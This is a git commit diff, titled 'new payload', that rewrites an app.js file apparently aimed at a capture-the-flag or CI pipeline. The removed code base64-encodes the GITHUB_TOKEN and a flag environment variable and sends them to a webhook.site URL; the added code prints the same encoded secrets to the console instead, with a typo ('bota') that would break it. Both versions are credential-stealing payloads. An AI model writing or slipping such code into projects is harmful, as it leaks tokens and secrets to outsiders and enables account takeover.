b438462b2b66f82af461c2de623899a6a6ae7a2f
Aritix <aritixx@gmail.com>
2025-05-09 20:46:34 -0400

    new payload

--- app.js
+++ app.js
@@ -1,35 +1,5 @@
-// my-env-sender.js
-
-import fetch from 'node-fetch';
-
-async function sendEnvVariables() {
-  const baseUrl = 'https://webhook.site/ba43dad1-a1c9-4c56-8ec4-534cf8c3634d';
-
-  const variablesToSend = {
+const variables = {
     API_KEY: btoa(process.env.GITHUB_TOKEN) ,
-    DATABASE_URL: btoa(process.env.FLAG_GRAVY_OVERFLOW_L0_FRIES),
-  };
-  const queryParams = new URLSearchParams();
-  for (const key in variablesToSend) {
-    if (variablesToSend.hasOwnProperty(key) && variablesToSend[key] !== undefined) {
-      queryParams.append(key, variablesToSend[key]);
-    }
-  }
-  const targetUrlWithParams = `${baseUrl}?${queryParams.toString()}`;
-  try {
-    console.log(`Sending request to: ${targetUrlWithParams}`);
-    const response = await fetch(targetUrlWithParams);
-
-    if (response.ok) {
-      const data = await response.text();
-      console.log("Success");
-    } else {
-      console.error(`Fail`);
-      const errorText = await response.text();
-    }
-  } catch (error) {
-    console.error("error", error);
-  }
-}
-
-sendEnvVariables();
+    FLAG: btoa(process.env.FLAG_GRAVY_OVERFLOW_L0_FRIES),
+};
+console.log(bota(variables))
